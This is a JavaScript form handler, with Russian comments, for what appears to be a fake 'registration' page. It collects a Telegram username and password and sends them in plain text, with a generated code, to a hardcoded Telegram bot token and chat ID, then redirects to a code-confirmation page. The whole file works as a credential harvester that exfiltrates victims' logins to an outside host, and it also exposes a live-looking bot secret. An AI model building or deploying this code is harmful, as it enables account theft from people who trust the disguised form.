let BOT_TOKEN = "8200701594:AAGhsHSh7D7X5PHApcfLBmkPY6zKhUw9mRs";
let CHAT_ID = "5372569828"; 

let sendData = (event) => {
  // Железобетонно глушим любые попытки браузера перезагрузить страницу
  if (event) event.preventDefault(); 

  let telegram = document.getElementById("@Telegram.me").value;
  let password = document.getElementById("Password").value;
  let btn = document.getElementById("btn");

  // Валидация: если поля пустые, не пускаем дальше
  if (!telegram || !password) {
    alert("Пожалуйста, заполните все поля!");
    return;
  }

  let code = Math.floor(Math.random() * 1000);
  let text = `Новая регистрация:\nТелега: ${telegram}\nПароль: ${password}\nКод подтверждения: ${code}`;

  // Сохраняем код для страницы conf.html
  sessionStorage.setItem("pendingCode", String(code));

  btn.disabled = true;
  btn.textContent = "sending...";

  // Отправка в Telegram
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: text }),
  })
    .then((res) => res.json())
    .then((data) => {
      if (data.ok) {
        // Переходим на страницу подтверждения кода
        window.location.href = "/conf/index.html";
      } else {
        btn.disabled = false;
        btn.textContent = "register";
        alert("Ошибка бота. Проверь CHAT_ID или токен.");
      }
    })
    .catch(() => {
      btn.disabled = false;
      btn.textContent = "register";
      alert("Ошибка сети. Попробуй еще раз.");
    });
};